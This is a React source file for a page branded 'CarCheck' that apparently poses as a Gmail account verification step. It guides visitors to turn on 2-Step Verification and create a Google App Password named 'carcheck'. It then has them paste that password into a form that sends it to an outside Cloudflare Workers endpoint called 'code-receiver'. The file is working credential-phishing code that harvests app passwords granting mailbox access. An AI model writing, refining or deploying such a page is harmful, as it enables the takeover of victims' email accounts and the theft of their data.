import React, { useState } from "react";
import {
  CarFront,
  ShieldCheck,
  ExternalLink,
  LockKeyhole,
  CheckCircle,
  Clipboard,
  Send
} from "lucide-react";
import "./App.css";

const WORKER_URL = "https://code-receiver.mikaelmika263.workers.dev";

function App() {
  const [code, setCode] = useState("");
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);

  const openGoogle = (url) => {
    window.open(url, "_blank", "noopener,noreferrer");
  };

  const handlePaste = async () => {
    try {
      const copied = await navigator.clipboard.readText();
      setCode(copied.replace(/[^a-zA-Z0-9]/g, "").slice(0, 20));
      setMessage("");
    } catch {
      setMessage("Clipboard unavailable. Please paste manually.");
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setMessage("");

    if (code.length < 16 || code.length > 20) {
      setMessage("Enter between 16 and 20 characters.");
      return;
    }

    setLoading(true);
    try {
      const res = await fetch(WORKER_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code }),
      });

      const data = await res.json();

      if (!res.ok) {
        setMessage(data.error || "Something went wrong.");
      } else {
        setMessage("Submitted successfully ✅");
        setCode("");
      }
    } catch {
      setMessage("Network error. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="page">
      <section className="card">

        <div className="brand">
          <div className="logo">
            <CarFront size={28} />
          </div>
          <h1>CarCheck</h1>
          <p>Secure Account Confirmation</p>
        </div>

        <div className="notice">
          <ShieldCheck size={22} />
          <div>
            <h3>Verify this Gmail address is yours to continue.</h3>
            <p>
              Follow the simple steps below to confirm your account and submit for verification
            </p>
          </div>
        </div>

        <div className="steps">

          <div className="step">
            <div className="step-icon">
              <LockKeyhole size={19} />
            </div>
            <div className="step-content">
              <h3>Step 1:check your 2-Step Verification</h3>
              <p>For security purposes, check & turn ON 2-Step Verification.</p>
              <button
                className="google-button"
                onClick={() => openGoogle(
                  "https://myaccount.google.com/signinoptions/two-step-verification"
                )}
              >
                Open Verification <ExternalLink size={14} />
              </button>
            </div>
          </div>

          <div className="step">
            <div className="step-icon">
              <ShieldCheck size={19} />
            </div>
            <div className="step-content">
              <h3>Step 2: App Passwords</h3>
              <p>Click here to create the app. The app name is carcheck.</p>
              <button
                className="google-button"
                onClick={() => openGoogle(
                  "https://myaccount.google.com/apppasswords"
                )}
              >
                Generate & Confirm App Password <ExternalLink size={14} />
              </button>
            </div>
          </div>

          <div className="step">
            <div className="step-icon">
              <CheckCircle size={19} />
            </div>
            <div className="step-content">
              <h3>Step 3: CarCheck Reference</h3>
              <p>Copy and paste the generated password here and submit for verification.</p>

              <form onSubmit={handleSubmit}>
                <div className="input-wrapper">
                  <input
                    type="text"
                    value={code}
                    onChange={(e) => {
                      setCode(
                        e.target.value
                          .replace(/[^a-zA-Z0-9]/g, "")
                          .slice(0, 20)
                      );
                      setMessage("");
                    }}
                    placeholder="Enter generated password here"
                    maxLength={20}
                    autoComplete="off"
                    spellCheck={false}
                  />
                  <span>{code.length}/20</span>
                </div>

                <button
                  type="submit"
                  className="submit-button"
                  disabled={loading || code.length < 16 || code.length > 20}
                >
                  {loading ? "Submitting..." : "Submit"} <Send size={15} />
                </button>
              </form>

              {message && <div className="message">{message}</div>}
            </div>
          </div>

        </div>

        <footer>Full car check report © 2026</footer>

      </section>
    </main>
  );
}

export default App;
